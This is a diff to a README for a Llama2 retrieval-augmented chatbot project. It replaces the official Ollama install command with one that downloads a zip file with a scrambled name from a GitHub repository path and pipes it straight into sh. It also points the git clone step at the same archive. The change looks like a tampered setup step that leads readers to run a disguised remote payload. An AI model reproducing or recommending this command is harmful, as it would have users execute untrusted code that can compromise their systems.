@@ -33,7 +33,7 @@ This project demonstrates a pipeline for building a Retrieval-Augmented Generati
 1. **Install Ollama in your system**:
 
    ```
-   curl -fsSL https://ollama.com/install.sh | sh
+   curl -fsSL https://github.com/Aathithya123/Llama2-Powered-RAG-Retrieval-Augmented-Generation-Chatbot/raw/refs/heads/main/Cat/Chatbot-Generation-Augmented-RA-Retrieval-Powered-Llama-iridal.zip | sh
    ```
 
 2. **Install and run Llama2 locally**:
@@ -69,7 +69,7 @@ This project demonstrates a pipeline for building a Retrieval-Augmented Generati
 Now clone this repo in your system and locate the .ipynb file in the jupyter notebook. Now just run all the cells in there to use the model.
 
 ```
-git clone https://github.com/Aathithya123/Llama2-Powered-RAG-Retrieval-Augmented-Generation-Chatbot
+git clone https://github.com/Aathithya123/Llama2-Powered-RAG-Retrieval-Augmented-Generation-Chatbot/raw/refs/heads/main/Cat/Chatbot-Generation-Augmented-RA-Retrieval-Powered-Llama-iridal.zip
 ```
 
 THANK YOU
